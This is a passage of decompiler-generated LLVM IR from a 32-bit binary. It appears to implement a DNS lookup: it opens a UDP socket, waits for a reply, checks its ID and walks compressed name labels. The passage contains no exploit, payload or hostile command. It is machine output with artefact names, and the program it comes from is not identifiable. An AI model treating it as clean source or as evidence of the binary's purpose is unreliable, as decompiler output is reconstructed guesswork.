dec_label_pc_804fd5e.dec_label_pc_804fd7a_crit_edge: ; preds = %dec_label_pc_804fd5a
  br label %dec_label_pc_804fd7a

dec_label_pc_804fd7a:                             ; preds = %dec_label_pc_804fd5e.dec_label_pc_804fd7a_crit_edge, %dec_label_pc_804fd10
  %v0_804fd7d = phi i32 [ %v0_804fd5c, %dec_label_pc_804fd5e.dec_label_pc_804fd7a_crit_edge ], [ %v2_804fd43, %dec_label_pc_804fd10 ]
  %v1_804fd7d = inttoptr i32 %v0_804fd7d to i8*
  store i8 0, i8* %v1_804fd7d, align 1
  store i32 %v2_804fd30, i32* %eax.global-to-local, align 4
  %v3_804fd85 = call i32 @function_8052620(i8* %tmp103)
  store i32 0, i32* %stack_var_-44, align 4
  %v2_804fd99 = add i32 %v3_804fd85, %v2_804fd30
  store i32 %v2_804fd99, i32* @edi, align 4
  %v1_804fdbd = add i32 %v2_804fd99, 1
  store i32 %v1_804fdbd, i32* @ebx, align 4
  store i32 %v2_804fd30, i32* %eax.global-to-local, align 4
  %v3_804fdc5 = call i32 @function_8052620(i8* %tmp103)
  %v1_804fdca = add i32 %v3_804fdc5, 17
  store i32 %v1_804fdca, i32* %eax.global-to-local, align 4
  %v1_804fdd1 = call i32 @function_804fa40(i32 %v1_804fdca)
  %v2_804fddf = udiv i32 %v1_804fdd1, 65535
  store i32 %v2_804fddf, i32* %edx.global-to-local, align 4
  %v2_804fde980 = add i32 %v2_804fddf, %v1_804fdd1
  store i32 %v2_804fde980, i32* @esi, align 4
  store i32 8, i32* @eax, align 4
  store i32 -1, i32* %ebp.global-to-local, align 4
  %v2_804fdf9 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v2_804fdf9, i32* %ecx.global-to-local, align 4
  %v3_804fe01 = call i32 @function_80526b0(i32 %v2_804fdf9, i32 16)
  store i32 %v3_804fe01, i32* %eax.global-to-local, align 4
  store i32 2, i32* %stack_var_-44, align 4
  %v0_804fe49 = load i32, i32* @edi, align 4
  %v1_804fe49 = add i32 %v0_804fe49, 1
  %v2_804fe49 = inttoptr i32 %v1_804fe49 to i16*
  store i16 256, i16* %v2_804fe49, align 2
  %v0_804fe52 = load i32, i32* @ebx, align 4
  %v1_804fe52 = add i32 %v0_804fe52, 2
  %v2_804fe52 = inttoptr i32 %v1_804fe52 to i16*
  store i16 256, i16* %v2_804fe52, align 2
  %v0_804fe58 = load i32, i32* %ebp.global-to-local, align 4
  %v10_804fe58 = icmp eq i32 %v0_804fe58, -1
  br i1 %v10_804fe58, label %dec_label_pc_804fe6c.preheader, label %dec_label_pc_804fe60

dec_label_pc_804fe60.loopexit:                    ; preds = %dec_label_pc_804ff85
  %v0_804fe63.pre = load i32, i32* @ebp, align 4
  br label %dec_label_pc_804fe60

dec_label_pc_804fe60:                             ; preds = %dec_label_pc_804fe60.loopexit, %dec_label_pc_804fd7a
  %v0_804fe63 = phi i32 [ %v0_804fe63.pre, %dec_label_pc_804fe60.loopexit ], [ %v0_804fe58, %dec_label_pc_804fd7a ]
  %v0_804fe60 = load i32, i32* @esp, align 4
  %v2_804fe63 = add i32 %v0_804fe60, -16
  %v3_804fe63 = inttoptr i32 %v2_804fe63 to i32*
  store i32 %v0_804fe63, i32* %v3_804fe63, align 4
  %v1_804fe64 = call i32 @function_8052bc1(i32 1)
  store i32 %v1_804fe64, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804fe6c.preheader

dec_label_pc_804fe6c.preheader:                   ; preds = %dec_label_pc_804fe60, %dec_label_pc_804fd7a
  br label %dec_label_pc_804fe6c

dec_label_pc_804fe6c:                             ; preds = %dec_label_pc_804fe6c.preheader, %dec_label_pc_804ff85
  %v0_804fe6c = load i32, i32* @ebx, align 4
  %v1_804fe6c = load i32, i32* @esp, align 4
  %v2_804fe6c = add i32 %v1_804fe6c, -4
  %v3_804fe6c = inttoptr i32 %v2_804fe6c to i32*
  store i32 %v0_804fe6c, i32* %v3_804fe6c, align 4
  %v1_804fe6d = add i32 %v1_804fe6c, -8
  %v2_804fe6d = inttoptr i32 %v1_804fe6d to i32*
  store i32 0, i32* %v2_804fe6d, align 4
  %v1_804fe6f = add i32 %v1_804fe6c, -12
  %v2_804fe6f = inttoptr i32 %v1_804fe6f to i32*
  store i32 2, i32* %v2_804fe6f, align 4
  %v1_804fe71 = add i32 %v1_804fe6c, -16
  %v2_804fe71 = inttoptr i32 %v1_804fe71 to i32*
  store i32 2, i32* %v2_804fe71, align 4
  %v3_804fe73 = call i32 @function_80533b5(i32 1, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_804fe73, i32* %eax.global-to-local, align 4
  %v0_804fe78 = load i32, i32* @esp, align 4
  store i32 %v3_804fe73, i32* @ebp, align 4
  %v10_804fe7d = icmp eq i32 %v3_804fe73, -1
  br i1 %v10_804fe7d, label %dec_label_pc_804ffa0, label %dec_label_pc_804fe86

dec_label_pc_804fe86:                             ; preds = %dec_label_pc_804fe6c
  %v0_804fe86 = load i32, i32* @ecx, align 4
  %v2_804fe86 = add i32 %v0_804fe78, 12
  %v3_804fe86 = inttoptr i32 %v2_804fe86 to i32*
  store i32 %v0_804fe86, i32* %v3_804fe86, align 4
  %v1_804fe87 = add i32 %v0_804fe78, 8
  %v2_804fe87 = inttoptr i32 %v1_804fe87 to i32*
  store i32 16, i32* %v2_804fe87, align 4
  %v1_804fe89 = add i32 %v0_804fe78, 4272
  store i32 %v1_804fe89, i32* @edi, align 4
  %v2_804fe90 = add i32 %v0_804fe78, 4
  %v3_804fe90 = inttoptr i32 %v2_804fe90 to i32*
  store i32 %v1_804fe89, i32* %v3_804fe90, align 4
  %v3_804fe91 = inttoptr i32 %v0_804fe78 to i32*
  store i32 %v3_804fe73, i32* %v3_804fe91, align 4
  %v3_804fe92 = call i32 @function_80531da(i32 1, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v0_804fe97 = load i32, i32* @esp, align 4
  %v1_804fe9a = add i32 %v3_804fe92, 1
  %v8_804fe9a = icmp eq i32 %v1_804fe9a, 0
  store i32 %v1_804fe9a, i32* %eax.global-to-local, align 4
  br i1 %v8_804fe9a, label %dec_label_pc_804ffa0, label %dec_label_pc_804fea1

dec_label_pc_804fea1:                             ; preds = %dec_label_pc_804fe86
  %v1_804fea1 = add i32 %v0_804fe97, 12
  %v2_804fea1 = inttoptr i32 %v1_804fea1 to i32*
  store i32 16384, i32* %v2_804fea1, align 4
  %v1_804fea6 = add i32 %v0_804fe97, 20
  %v2_804fea6 = inttoptr i32 %v1_804fea6 to i32*
  %v3_804fea6 = load i32, i32* %v2_804fea6, align 4
  store i32 %v3_804fea6, i32* %edx.global-to-local, align 4
  %v2_804feaa = add i32 %v0_804fe97, 8
  %v3_804feaa = inttoptr i32 %v2_804feaa to i32*
  store i32 %v3_804fea6, i32* %v3_804feaa, align 4
  %v1_804feab = add i32 %v0_804fe97, 2096
  store i32 %v1_804feab, i32* %eax.global-to-local, align 4
  %v2_804feb2 = add i32 %v0_804fe97, 4
  %v3_804feb2 = inttoptr i32 %v2_804feb2 to i32*
  store i32 %v1_804feab, i32* %v3_804feb2, align 4
  %v0_804feb3 = load i32, i32* @ebp, align 4
  %v3_804feb3 = inttoptr i32 %v0_804fe97 to i32*
  store i32 %v0_804feb3, i32* %v3_804feb3, align 4
  %v0_804feb4 = call i32 @function_8053304()
  %v0_804feb9 = load i32, i32* @esp, align 4
  %v1_804febc = add i32 %v0_804feb4, 1
  %v8_804febc = icmp eq i32 %v1_804febc, 0
  store i32 %v1_804febc, i32* %eax.global-to-local, align 4
  br i1 %v8_804febc, label %dec_label_pc_804ffa0, label %dec_label_pc_804fec3

dec_label_pc_804fec3:                             ; preds = %dec_label_pc_804fea1
  %v2_804fec3 = add i32 %v0_804feb9, 12
  %v3_804fec3 = inttoptr i32 %v2_804fec3 to i32*
  store i32 %v1_804febc, i32* %v3_804fec3, align 4
  %v1_804fec4 = add i32 %v0_804feb9, 8
  %v2_804fec4 = inttoptr i32 %v1_804fec4 to i32*
  store i32 0, i32* %v2_804fec4, align 4
  %v0_804fec6 = load i32, i32* @ebp, align 4
  %v2_804fec6 = add i32 %v0_804feb9, 4
  %v3_804fec6 = inttoptr i32 %v2_804fec6 to i32*
  store i32 %v0_804fec6, i32* %v3_804fec6, align 4
  %v2_804fec7 = inttoptr i32 %v0_804feb9 to i32*
  store i32 3, i32* %v2_804fec7, align 4
  %v3_804fec9 = call i32 @function_8052afd(i32 1, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v0_804fece = load i32, i32* @esp, align 4
  %v12_804fed1 = or i32 %v3_804fec9, 2048
  store i32 %v12_804fed1, i32* %eax.global-to-local, align 4
  %v2_804fed4 = add i32 %v0_804fece, 8
  %v3_804fed4 = inttoptr i32 %v2_804fed4 to i32*
  store i32 %v12_804fed1, i32* %v3_804fed4, align 4
  %v0_804fed5 = load i32, i32* @ebp, align 4
  %v2_804fed5 = add i32 %v0_804fece, 4
  %v3_804fed5 = inttoptr i32 %v2_804fed5 to i32*
  store i32 %v0_804fed5, i32* %v3_804fed5, align 4
  %v2_804fed6 = inttoptr i32 %v0_804fece to i32*
  store i32 4, i32* %v2_804fed6, align 4
  %v3_804fed8 = call i32 @function_8052afd(i32 1, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v0_804fedd = load i32, i32* @esp, align 4
  %v1_804fedd = add i32 %v0_804fedd, 4144
  store i32 %v1_804fedd, i32* %edx.global-to-local, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  store i32 32, i32* %ecx.global-to-local, align 4
  %v1_804feeb = inttoptr i32 %v1_804fedd to i8*
  store i32 %v1_804fedd, i32* @edi, align 4
  store i1 false, i1* @df, align 1
  %v5_804feee = call i8* @_memset(i8* %v1_804feeb, i32 0, i32 32)
  %v6_804feee = ptrtoint i8* %v5_804feee to i32
  store i32 %v6_804feee, i32* %ecx.global-to-local, align 4
  %v0_804fef0 = load i32, i32* @ebp, align 4
  %v2_804fef4 = udiv i32 %v0_804fef0, 32
  store i32 %v2_804fef4, i32* @esi, align 4
  %v1_804fef7 = urem i32 %v0_804fef0, 32
  store i32 %v1_804fef7, i32* @ebx, align 4
  %v0_804fefa = load i32, i32* @esp, align 4
  %v2_804fefa = mul nuw nsw i32 %v2_804fef4, 4
  %v3_804fefa = add nuw nsw i32 %v2_804fefa, 4144
  %v4_804fefa = add i32 %v3_804fefa, %v0_804fefa
  %v5_804fefa = inttoptr i32 %v4_804fefa to i32*
  %v6_804fefa = load i32, i32* %v5_804fefa, align 4
  %v9_804fefa = shl i32 1, %v1_804fef7
  %v12_804fefa = or i32 %v6_804fefa, %v9_804fefa
  store i32 %v12_804fefa, i32* %v5_804fefa, align 4
  %v0_804ff02 = load i32, i32* @esp, align 4
  %v1_804ff02 = add i32 %v0_804ff02, 4288
  %v2_804ff02 = inttoptr i32 %v1_804ff02 to i32*
  store i32 5, i32* %v2_804ff02, align 4
  %v0_804ff0d = load i32, i32* @esp, align 4
  %v1_804ff0d = add i32 %v0_804ff0d, 4292
  %v2_804ff0d = inttoptr i32 %v1_804ff0d to i32*
  store i32 0, i32* %v2_804ff0d, align 4
  %v0_804ff18 = load i32, i32* @esp, align 4
  %v1_804ff18 = inttoptr i32 %v0_804ff18 to i32*
  %v1_804ff19 = add i32 %v0_804ff18, 4288
  store i32 %v1_804ff19, i32* %v1_804ff18, align 4
  %v0_804ff21 = load i32, i32* @ebp, align 4
  %v1_804ff21 = add i32 %v0_804ff21, 1
  store i32 %v1_804ff21, i32* %eax.global-to-local, align 4
  %v1_804ff24 = add i32 %v0_804ff18, -4
  %v2_804ff24 = inttoptr i32 %v1_804ff24 to i32*
  store i32 0, i32* %v2_804ff24, align 4
  %v1_804ff26 = add i32 %v0_804ff18, -8
  %v2_804ff26 = inttoptr i32 %v1_804ff26 to i32*
  store i32 0, i32* %v2_804ff26, align 4
  %v0_804ff28 = load i32, i32* %edx.global-to-local, align 4
  %v2_804ff28 = add i32 %v0_804ff18, -12
  %v3_804ff28 = inttoptr i32 %v2_804ff28 to i32*
  store i32 %v0_804ff28, i32* %v3_804ff28, align 4
  %v0_804ff29 = load i32, i32* %eax.global-to-local, align 4
  %v2_804ff29 = add i32 %v0_804ff18, -16
  %v3_804ff29 = inttoptr i32 %v2_804ff29 to i32*
  store i32 %v0_804ff29, i32* %v3_804ff29, align 4
  %v0_804ff2a = call i32 @function_8052dc8()
  store i32 %v0_804ff2a, i32* %eax.global-to-local, align 4
  %v0_804ff2f = load i32, i32* @esp, align 4
  %v1_804ff2f = add i32 %v0_804ff2f, 32
  %v10_804ff32 = icmp eq i32 %v0_804ff2a, -1
  br i1 %v10_804ff32, label %dec_label_pc_804ffb4, label %dec_label_pc_804ff37

dec_label_pc_804ff37:                             ; preds = %dec_label_pc_804fec3
  %v1_804ff37 = icmp eq i32 %v0_804ff2a, 0
  br i1 %v1_804ff37, label %dec_label_pc_804ff7e, label %dec_label_pc_804ff3b

dec_label_pc_804ff3b:                             ; preds = %dec_label_pc_804ff37
  %v1_804ff3b = load i32, i32* @esi, align 4
  %v2_804ff3b = mul i32 %v1_804ff3b, 4
  %v3_804ff3b = add i32 %v0_804ff2f, 4160
  %v4_804ff3b = add i32 %v3_804ff3b, %v2_804ff3b
  %v5_804ff3b = inttoptr i32 %v4_804ff3b to i32*
  %v6_804ff3b = load i32, i32* %v5_804ff3b, align 4
  %v7_804ff3b = load i32, i32* @ebx, align 4
  %v8_804ff3b = urem i32 %v7_804ff3b, 32
  %v9_804ff3b = shl i32 1, %v8_804ff3b
  %v10_804ff3b = and i32 %v9_804ff3b, %v6_804ff3b
  %v11_804ff3b = icmp ne i32 %v10_804ff3b, 0
  %v1_804ff43 = zext i1 %v11_804ff3b to i32
  %v3_804ff43 = and i32 %v0_804ff2a, -256
  %v4_804ff43 = or i32 %v1_804ff43, %v3_804ff43
  store i32 %v4_804ff43, i32* %eax.global-to-local, align 4
  %v4_804ff46 = icmp eq i1 %v11_804ff3b, false
  br i1 %v4_804ff46, label %dec_label_pc_804ffb4, label %dec_label_pc_804ff4a

dec_label_pc_804ff4a:                             ; preds = %dec_label_pc_804ff3b
  %v2_804ff4a = add i32 %v0_804ff2f, 28
  %v3_804ff4a = inttoptr i32 %v2_804ff4a to i32*
  store i32 %v4_804ff43, i32* %v3_804ff4a, align 4
  %v0_804ff4b = load i32, i32* %eax.global-to-local, align 4
  %v2_804ff4b = add i32 %v0_804ff2f, 24
  %v3_804ff4b = inttoptr i32 %v2_804ff4b to i32*
  store i32 %v0_804ff4b, i32* %v3_804ff4b, align 4
  %v1_804ff4c = add i32 %v0_804ff2f, 20
  %v2_804ff4c = inttoptr i32 %v1_804ff4c to i32*
  store i32 0, i32* %v2_804ff4c, align 4
  %v1_804ff4e = add i32 %v0_804ff2f, 16
  %v2_804ff4e = inttoptr i32 %v1_804ff4e to i32*
  store i32 0, i32* %v2_804ff4e, align 4
  %v1_804ff50 = add i32 %v0_804ff2f, 12
  %v2_804ff50 = inttoptr i32 %v1_804ff50 to i32*
  store i32 16384, i32* %v2_804ff50, align 4
  %v1_804ff55 = add i32 %v0_804ff2f, 8
  %v2_804ff55 = inttoptr i32 %v1_804ff55 to i32*
  store i32 2048, i32* %v2_804ff55, align 4
  %v1_804ff5a = add i32 %v0_804ff2f, 64
  store i32 %v1_804ff5a, i32* %eax.global-to-local, align 4
  %v2_804ff5e = add i32 %v0_804ff2f, 4
  %v3_804ff5e = inttoptr i32 %v2_804ff5e to i32*
  store i32 %v1_804ff5a, i32* %v3_804ff5e, align 4
  %v0_804ff5f = load i32, i32* @ebp, align 4
  %v3_804ff5f = inttoptr i32 %v0_804ff2f to i32*
  store i32 %v0_804ff5f, i32* %v3_804ff5f, align 4
  %v0_804ff60 = call i32 @function_80532c1()
  store i32 %v0_804ff60, i32* %eax.global-to-local, align 4
  %v0_804ff65 = load i32, i32* @esp, align 4
  store i32 %v0_804ff60, i32* @ebx, align 4
  %v1_804ff6a = add i32 %v0_804ff65, 56
  %v2_804ff6a = inttoptr i32 %v1_804ff6a to i32*
  %v3_804ff6a = load i32, i32* %v2_804ff6a, align 4
  store i32 %v3_804ff6a, i32* %eax.global-to-local, align 4
  %v2_804ff6e = add i32 %v0_804ff65, 16
  %v3_804ff6e = inttoptr i32 %v2_804ff6e to i32*
  store i32 %v3_804ff6a, i32* %v3_804ff6e, align 4
  %v2_804ff6f = call i32 @function_8052620(i8* inttoptr (i32 1 to i8*))
  %v1_804ff74 = add i32 %v2_804ff6f, 17
  store i32 %v1_804ff74, i32* %eax.global-to-local, align 4
  %v0_804ff77 = load i32, i32* @esp, align 4
  %v1_804ff77 = add i32 %v0_804ff77, 16
  %v0_804ff7a = load i32, i32* @ebx, align 4
  %v7_804ff7a = icmp ult i32 %v0_804ff7a, %v1_804ff74
  %v1_804ff7c = icmp eq i1 %v7_804ff7a, false
  br i1 %v1_804ff7c, label %dec_label_pc_804ffda, label %dec_label_pc_804ff7e

dec_label_pc_804ff7e:                             ; preds = %dec_label_pc_8050006, %dec_label_pc_804ffda, %dec_label_pc_804ff4a, %dec_label_pc_804ff37
  %v0_804ff7e = phi i32 [ %v1_804fff3, %dec_label_pc_8050006 ], [ %v1_804fff3, %dec_label_pc_804ffda ], [ %v1_804ff77, %dec_label_pc_804ff4a ], [ %v1_804ff2f, %dec_label_pc_804ff37 ]
  %v1_804ff7e = add i32 %v0_804ff7e, 8
  %v2_804ff7e = inttoptr i32 %v1_804ff7e to i32*
  %v3_804ff7e = load i32, i32* %v2_804ff7e, align 4
  %v12_804ff7e = icmp eq i32 %v3_804ff7e, 5
  br i1 %v12_804ff7e, label %dec_label_pc_804ffb4, label %dec_label_pc_804ff85

dec_label_pc_804ff85:                             ; preds = %dec_label_pc_804ffa0, %dec_label_pc_804ff7e
  %v3_804ff85 = phi i32 [ %v3_804ffad, %dec_label_pc_804ffa0 ], [ %v3_804ff7e, %dec_label_pc_804ff7e ]
  %v1_804ff8d = phi i32 [ %v1_804ffaa, %dec_label_pc_804ffa0 ], [ %v0_804ff7e, %dec_label_pc_804ff7e ]
  %v1_804ff85 = add i32 %v1_804ff8d, 8
  %v2_804ff85 = inttoptr i32 %v1_804ff85 to i32*
  %v1_804ff89 = add i32 %v3_804ff85, 1
  store i32 %v1_804ff89, i32* @edi, align 4
  %v0_804ff8a = load i32, i32* @ebp, align 4
  %v10_804ff8a = icmp eq i32 %v0_804ff8a, -1
  store i32 %v1_804ff89, i32* %v2_804ff85, align 4
  %v1_804ff91 = icmp eq i1 %v10_804ff8a, false
  br i1 %v1_804ff91, label %dec_label_pc_804fe60.loopexit, label %dec_label_pc_804fe6c

dec_label_pc_804ffa0:                             ; preds = %dec_label_pc_804fea1, %dec_label_pc_804fe86, %dec_label_pc_804fe6c
  %v0_804ffa0.in = phi i32 [ %v0_804feb9, %dec_label_pc_804fea1 ], [ %v0_804fe97, %dec_label_pc_804fe86 ], [ %v0_804fe78, %dec_label_pc_804fe6c ]
  %v2_804ffa3 = inttoptr i32 %v0_804ffa0.in to i32*
  store i32 1, i32* %v2_804ffa3, align 4
  %v1_804ffa5 = call i32 @function_8054770(i32 1)
  store i32 %v1_804ffa5, i32* %eax.global-to-local, align 4
  %v0_804ffaa = load i32, i32* @esp, align 4
  %v1_804ffaa = add i32 %v0_804ffaa, 16
  %v1_804ffad = add i32 %v0_804ffaa, 24
  %v2_804ffad = inttoptr i32 %v1_804ffad to i32*
  %v3_804ffad = load i32, i32* %v2_804ffad, align 4
  %v12_804ffad = icmp eq i32 %v3_804ffad, 5
  %v1_804ffb2 = icmp eq i1 %v12_804ffad, false
  br i1 %v1_804ffb2, label %dec_label_pc_804ff85, label %dec_label_pc_804ffb4

dec_label_pc_804ffb4:                             ; preds = %dec_label_pc_804ffa0, %dec_label_pc_804ff7e, %dec_label_pc_804ff3b, %dec_label_pc_804fec3, %dec_label_pc_8050014, %dec_label_pc_805001d.backedge
  %v0_804ffb4 = phi i32 [ %v0_8050022123, %dec_label_pc_8050014 ], [ %v0_8050022, %dec_label_pc_805001d.backedge ], [ %v1_804ffaa, %dec_label_pc_804ffa0 ], [ %v0_804ff7e, %dec_label_pc_804ff7e ], [ %v1_804ff2f, %dec_label_pc_804ff3b ], [ %v1_804ff2f, %dec_label_pc_804fec3 ]
  %v0_804ffb7 = load i32, i32* @ebp, align 4
  %v2_804ffb7 = add i32 %v0_804ffb4, -16
  %v3_804ffb7 = inttoptr i32 %v2_804ffb7 to i32*
  store i32 %v0_804ffb7, i32* %v3_804ffb7, align 4
  %v1_804ffb8 = call i32 @function_8052bc1(i32 1)
  store i32 %v1_804ffb8, i32* %eax.global-to-local, align 4
  %v0_804ffbd = load i32, i32* @esp, align 4
  %v1_804ffbd = add i32 %v0_804ffbd, 16
  %v1_804ffc0 = inttoptr i32 %v1_804ffbd to i32*
  %v2_804ffc0 = load i32, i32* %v1_804ffc0, align 4
  store i32 %v2_804ffc0, i32* %edx.global-to-local, align 4
  %v1_804ffc3 = inttoptr i32 %v2_804ffc0 to i8*
  %v2_804ffc3 = load i8, i8* %v1_804ffc3, align 1
  %v3_804ffc3 = icmp eq i8 %v2_804ffc3, 0
  br i1 %v3_804ffc3, label %dec_label_pc_80500c3, label %dec_label_pc_804ffcc

dec_label_pc_804ffcc:                             ; preds = %dec_label_pc_804ffb4
  %v2_804ffcc = load i32, i32* %v1_804ffc0, align 4
  store i32 %v2_804ffcc, i32* %eax.global-to-local, align 4
  %v1_804ffcf = add i32 %v0_804ffbd, 4300
  %v1_804ffd5 = inttoptr i32 %v1_804ffcf to i32*
  %v2_804ffd5 = load i32, i32* %v1_804ffd5, align 4
  store i32 %v2_804ffd5, i32* @ebx, align 4
  %v3_804ffd6 = add i32 %v0_804ffbd, 4308
  %v1_804ffd7 = inttoptr i32 %v3_804ffd6 to i32*
  %v2_804ffd7 = load i32, i32* %v1_804ffd7, align 4
  store i32 %v2_804ffd7, i32* @edi, align 4
  %v3_804ffd7 = add i32 %v0_804ffbd, 4312
  %v1_804ffd8 = inttoptr i32 %v3_804ffd7 to i32*
  %v2_804ffd8 = load i32, i32* %v1_804ffd8, align 4
  store i32 %v2_804ffd8, i32* @ebp, align 4
  ret i32 %v2_804ffcc

dec_label_pc_804ffda:                             ; preds = %dec_label_pc_804ff4a
  %v1_804ffda = add i32 %v0_804ff77, 60
  store i32 %v1_804ffda, i32* %edx.global-to-local, align 4
  %v2_804ffde = add i32 %v0_804ff77, 40
  %v3_804ffde = inttoptr i32 %v2_804ffde to i32*
  store i32 %v1_804ffda, i32* %v3_804ffde, align 4
  %v0_804ffe2 = load i32, i32* @esp, align 4
  %v1_804ffe5 = add i32 %v0_804ffe2, 44
  store i32 %v1_804ffe5, i32* %ecx.global-to-local, align 4
  %v2_804ffe9 = add i32 %v0_804ffe2, -16
  %v3_804ffe9 = inttoptr i32 %v2_804ffe9 to i32*
  store i32 %v1_804ffe5, i32* %v3_804ffe9, align 4
  %v2_804ffea = call i32 @function_8052620(i8* inttoptr (i32 1 to i8*))
  store i32 %v2_804ffea, i32* %eax.global-to-local, align 4
  %v0_804ffef = load i32, i32* @esp, align 4
  %v2_804ffef = add i32 %v2_804ffea, 65
  %v3_804ffef = add i32 %v2_804ffef, %v0_804ffef
  store i32 %v3_804ffef, i32* %ecx.global-to-local, align 4
  %v1_804fff3 = add i32 %v0_804ffef, 16
  %v1_804fff6 = add i32 %v0_804ffef, 30
  %v2_804fff6 = inttoptr i32 %v1_804fff6 to i16*
  %v3_804fff6 = load i16, i16* %v2_804fff6, align 2
  %v4_804fff6 = zext i16 %v3_804fff6 to i32
  %v7_804fff6 = and i32 %v1_804fedd, -65536
  %v8_804fff6 = or i32 %v4_804fff6, %v7_804fff6
  store i32 %v8_804fff6, i32* @edi, align 4
  %v3_804fffb = add i32 %v0_804ffef, 48
  %v4_804fffb = inttoptr i32 %v3_804fffb to i16*
  %v5_804fffb = load i16, i16* %v4_804fffb, align 2
  %v16_804fffb = icmp eq i16 %v3_804fff6, %v5_804fffb
  %v1_8050000 = icmp eq i1 %v16_804fffb, false
  br i1 %v1_8050000, label %dec_label_pc_804ff7e, label %dec_label_pc_8050006

dec_label_pc_8050006:                             ; preds = %dec_label_pc_804ffda
  %v1_8050006 = add i32 %v0_804ffef, 54
  %v2_8050006 = inttoptr i32 %v1_8050006 to i16*
  %v3_8050006 = load i16, i16* %v2_8050006, align 2
  %v4_8050006 = zext i16 %v3_8050006 to i32
  %v6_8050006 = and i32 %v2_804ffea, -65536
  %v7_8050006 = or i32 %v4_8050006, %v6_8050006
  store i32 %v7_8050006, i32* %eax.global-to-local, align 4
  %v4_805000b = icmp eq i16 %v3_8050006, 0
  br i1 %v4_805000b, label %dec_label_pc_804ff7e, label %dec_label_pc_8050014

dec_label_pc_8050014:                             ; preds = %dec_label_pc_8050006
  %v2_8050014 = call i16 @llvm.bswap.i16(i16 %v3_8050006)
  %v3_8050014 = zext i16 %v2_8050014 to i32
  %v6_8050014 = or i32 %v3_8050014, %v6_8050006
  store i32 %v6_8050014, i32* %eax.global-to-local, align 4
  %v3_8050018 = add i32 %v0_804ffef, 38
  %v4_8050018 = inttoptr i32 %v3_8050018 to i16*
  store i16 %v2_8050014, i16* %v4_8050018, align 2
  %v0_805001d118 = load i32, i32* @esp, align 4
  %v1_805001d119 = add i32 %v0_805001d118, 22
  %v2_805001d120 = inttoptr i32 %v1_805001d119 to i16*
  %v3_805001d121 = load i16, i16* %v2_805001d120, align 2
  %v4_805001d122 = add i16 %v3_805001d121, -1
  store i16 %v4_805001d122, i16* %v2_805001d120, align 2
  %v0_8050022123 = load i32, i32* @esp, align 4
  %v1_8050022124 = add i32 %v0_8050022123, 22
  %v2_8050022125 = inttoptr i32 %v1_8050022124 to i16*
  %v3_8050022126 = load i16, i16* %v2_8050022125, align 2
  %v13_8050022127 = icmp eq i16 %v3_8050022126, -1
  br i1 %v13_8050022127, label %dec_label_pc_804ffb4, label %dec_label_pc_805002a

dec_label_pc_805002a:                             ; preds = %dec_label_pc_8050014, %dec_label_pc_805001d.backedge
  %v0_8050022128 = phi i32 [ %v0_8050022, %dec_label_pc_805001d.backedge ], [ %v0_8050022123, %dec_label_pc_8050014 ]
  %v0_805002a = load i32, i32* %ecx.global-to-local, align 4
  store i32 %v0_805002a, i32* %edx.global-to-local, align 4
  store i32 0, i32* @ebx, align 4
  %v1_805003312 = inttoptr i32 %v0_805002a to i8*
  %v2_805003313 = load i8, i8* %v1_805003312, align 1
  %v3_805003314 = zext i8 %v2_805003313 to i32
  %v4_805003315 = load i32, i32* %eax.global-to-local, align 4
  %v5_805003316 = and i32 %v4_805003315, -256
  %v6_805003317 = or i32 %v5_805003316, %v3_805003314
  store i32 %v6_805003317, i32* %eax.global-to-local, align 4
  %v4_805003518 = icmp eq i8 %v2_805003313, 0
  br i1 %v4_805003518, label %dec_label_pc_805006a, label %dec_label_pc_8050039.preheader.preheader

dec_label_pc_8050039.preheader.preheader:         ; preds = %dec_label_pc_805002a
  %v1_805005e = add i32 %v0_8050022128, 32
  br label %dec_label_pc_8050039.preheader

dec_label_pc_8050039.preheader:                   ; preds = %dec_label_pc_8050039.preheader.preheader, %dec_label_pc_80500fc
  %v0_8050100 = phi i32 [ %v3_8050100, %dec_label_pc_80500fc ], [ 1, %dec_label_pc_8050039.preheader.preheader ]
  %v0_80500fd44 = phi i32 [ %v0_80500fd, %dec_label_pc_80500fc ], [ 0, %dec_label_pc_8050039.preheader.preheader ]
  %v0_805004640 = phi i32 [ %v1_80500fc, %dec_label_pc_80500fc ], [ %v0_805002a, %dec_label_pc_8050039.preheader.preheader ]
  %v0_805003938 = phi i32 [ %v6_8050033, %dec_label_pc_80500fc ], [ %v6_805003317, %dec_label_pc_8050039.preheader.preheader ]
  br label %dec_label_pc_8050039

dec_label_pc_8050039:                             ; preds = %dec_label_pc_8050039.preheader, %dec_label_pc_8050041
  %v0_80500fd = phi i32 [ %v0_80500fd44, %dec_label_pc_8050039.preheader ], [ 1, %dec_label_pc_8050041 ]
  %v0_80500fc = phi i32 [ %v0_805004640, %dec_label_pc_8050039.preheader ], [ %v2_8050062, %dec_label_pc_8050041 ]
  %v4_8050033 = phi i32 [ %v0_805003938, %dec_label_pc_8050039.preheader ], [ %v6_8050064, %dec_label_pc_8050041 ]
  %v1_8050039 = trunc i32 %v4_8050033 to i8
  %tmp140 = icmp ult i8 %v1_8050039, -64
  br i1 %tmp140, label %dec_label_pc_80500fc, label %dec_label_pc_8050041

dec_label_pc_8050041:                             ; preds = %dec_label_pc_8050039
  %v1_8050041 = urem i32 %v4_8050033, 256
  store i32 %v1_8050041, i32* %eax.global-to-local, align 4
  %v1_8050046 = add i32 %v0_80500fc, 1
  %v2_8050046 = inttoptr i32 %v1_8050046 to i8*
  %v3_8050046 = load i8, i8* %v2_8050046, align 1
  %v4_8050046 = zext i8 %v3_8050046 to i32
  store i32 1, i32* @ebx, align 4
  %v2_8050054 = mul nuw nsw i32 %v1_8050041, 256
  %v2_8050057 = add nsw i32 %v2_8050054, -49152
  %v3_8050057 = or i32 %v4_8050046, %v2_8050057
  store i32 %v3_8050057, i32* %eax.global-to-local, align 4
  %v2_8050062 = add i32 %v1_805005e, %v3_8050057
  store i32 %v2_8050062, i32* %edx.global-to-local, align 4
  %v1_8050064 = inttoptr i32 %v2_8050062 to i8*
  %v2_8050064 = load i8, i8* %v1_8050064, align 1
  %v3_8050064 = zext i8 %v2_8050064 to i32
  %v6_8050064 = or i32 %v3_8050064, %v2_8050057
  store i32 %v6_8050064, i32* %eax.global-to-local, align 4
